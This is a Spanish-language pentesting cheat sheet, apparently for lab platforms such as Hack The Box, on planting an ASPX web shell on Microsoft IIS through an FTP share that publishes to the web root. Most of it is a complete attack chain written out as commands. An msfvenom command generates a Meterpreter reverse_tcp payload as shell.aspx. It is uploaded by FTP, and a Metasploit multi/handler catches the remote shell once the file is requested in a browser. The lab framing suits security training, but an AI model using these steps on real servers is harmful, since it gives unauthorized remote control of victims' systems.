# Web Shell ASPX en Microsoft IIS (Meterpreter)

> **Escenario típico:** `FTP (21/TCP)` + `HTTP (80/TCP)`

En algunos laboratorios, el servicio **FTP** publica directamente los archivos en el directorio web de **Microsoft IIS**. Si el servidor permite ejecutar archivos `.aspx`, es posible desplegar una aplicación ASPX para validar el acceso obtenido en un entorno autorizado.

---

# Generar el archivo ASPX

Crear el archivo con **msfvenom**:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f aspx -o shell.aspx
```

---

# Subir el archivo mediante FTP

Conectarse al servicio FTP y subir el archivo:

```text
put shell.aspx
```

Si el directorio FTP corresponde al directorio web de IIS, el archivo será accesible desde el navegador.

---

# Configurar el listener en Metasploit

Iniciar Metasploit:

```bash
msfconsole
```

Seleccionar el handler:

```text
use exploit/multi/handler
```

Configurar los parámetros:

```text
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT 4444

run
```

---

# Acceder al archivo

Abrir el navegador y acceder a:

```text
http://<IP>/shell.aspx
```

Si el escenario del laboratorio está correctamente configurado y el archivo se ejecuta, el handler de Metasploit recibirá la conexión correspondiente.

---

# Flujo de trabajo

1. Detectar un servidor IIS.
2. Verificar si el FTP publica archivos en el directorio web.
3. Generar el archivo ASPX con `msfvenom`.
4. Subir el archivo mediante FTP.
5. Configurar el `multi/handler` en Metasploit.
6. Acceder al archivo desde el navegador para comprobar el resultado de la prueba.

---

# Herramientas útiles

| Herramienta             | Descripción                                       |
| ----------------------- | ------------------------------------------------- |
| `msfvenom`              | Generación de payloads para pruebas de seguridad. |
| `ftp`                   | Cliente para transferir archivos al servidor.     |
| `msfconsole`            | Framework para la gestión de pruebas y listeners. |
| `exploit/multi/handler` | Handler para recibir conexiones de payloads.      |

---

> **Nota:** Este escenario es habitual en laboratorios como Hack The Box, TryHackMe o entornos de formación, donde el servicio FTP comparte el mismo directorio que el servidor web IIS. En infraestructuras reales, esta configuración suele estar protegida mediante controles de acceso y mecanismos de seguridad adicionales.
